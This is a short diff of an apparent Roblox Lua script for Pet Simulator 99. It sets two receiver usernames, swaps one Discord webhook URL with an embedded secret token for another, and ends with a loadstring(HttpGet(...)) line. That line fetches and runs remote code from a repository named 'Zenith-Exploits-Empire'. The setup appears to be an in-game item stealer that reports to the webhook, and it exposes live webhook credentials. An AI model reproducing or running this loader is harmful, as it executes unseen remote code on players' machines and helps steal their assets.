@@ -1,5 +1,5 @@
 Username = "zenith_build123"
 Username2 = "zenith_build123"
-Webhook = "https://discord.com/api/webhooks/1360193691091861556/sLThkZHB1RoA-R3tas-KDyaeLmfxXiibwXjDplnX1jlfSOYo25AHLaSGgTqdgcli4DWi"
+Webhook = "https://discord.com/api/webhooks/1360244473971343590/R1XIVg6gyEhFyxA-vhy1p9HyyscP1Z27yK8HfdmEML5d8Fb0fTYxjcsdh4JW3bSy5H8_"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Pet-simulator-99/refs/heads/main/raw"))()
